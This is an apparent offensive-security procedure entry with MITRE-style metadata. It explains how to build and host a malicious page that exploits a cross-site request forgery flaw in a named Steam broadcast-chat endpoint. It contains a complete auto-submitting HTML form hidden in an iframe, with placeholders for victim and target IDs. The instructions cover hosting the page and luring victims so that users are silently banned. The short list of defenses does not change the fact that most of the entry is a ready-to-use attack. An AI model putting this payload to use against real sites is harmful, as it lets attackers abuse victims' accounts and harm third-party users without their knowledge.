---
id: proc-csrf-html-craft-001
tags:
  - csrf
  - html
  - javascript
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:35.501Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-CSRF-HTML-Page

## Summary

This procedure creates a malicious HTML page with a hidden form and auto-submitting JavaScript to exploit the CSRF vulnerability in Steam's broadcast chat mute endpoint, enabling silent user bans or unbans.

## Description

The page uses an iframe to hide the submission and targets `https://steamcommunity.com/broadcast/ajaxupdateusermute/` with POST data including the extracted Steam ID, issuer ID (victim's), target chatter ID, and ban parameters. The endpoint lacks CSRF protection (no sessionid validation), allowing the attack. Prerequisites: Extracted Steam ID and target user IDs; outcomes: A hosted page ready for luring.

## Requirements

1. Text editor (e.g., VS Code) for HTML/JS creation
2. Web server to host the page (e.g., local Python server or remote hosting)
3. Knowledge of target user IDs (chattersteamid) from broadcast chat

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens (e.g., sessionid) on all POST endpoints
- Scan for hidden forms and auto-submits in web traffic
- Block or warn on cross-origin POSTs to sensitive endpoints

## Objectives

1. Build a stealthy HTML payload for CSRF execution
2. Configure ban/unban parameters accurately
3. Ensure silent operation via hidden elements

## Instructions

### Step 1: Create the HTML Structure

**Context**: Set up the basic page with hidden iframe and form.

Create an HTML file:

```html
<!DOCTYPE html>
<html>
<head><title>Invisible</title></head>
<body>
<iframe style="display:none;" name="hiddenframe"></iframe>
<form id="csrf-form" action="https://steamcommunity.com/broadcast/ajaxupdateusermute/" method="POST" target="hiddenframe">
<input type="hidden" name="broadcaststeamid" value="{EXTRACTED_STEAM_ID}">
<input type="hidden" name="issuersteamid" value="{VICTIM_STEAM_ID}">
<input type="hidden" name="chattersteamid" value="{TARGET_USER_ID}">
<input type="hidden" name="bantype" value="1">
<input type="hidden" name="duration" value="0">
<input type="hidden" name="perm" value="1">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

Replace placeholders with actual IDs (e.g., for permanent ban).

### Step 2: Host the Page

**Context**: Make the page accessible via URL for luring.

Upload to a web server or run locally with `python -m http.server 8000` and access via IP:port.

> Test locally to ensure form submits without errors.

**Expected Output**: Page loads invisibly and triggers POST on access.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
- [[JavaScript]]
- [[payload]]
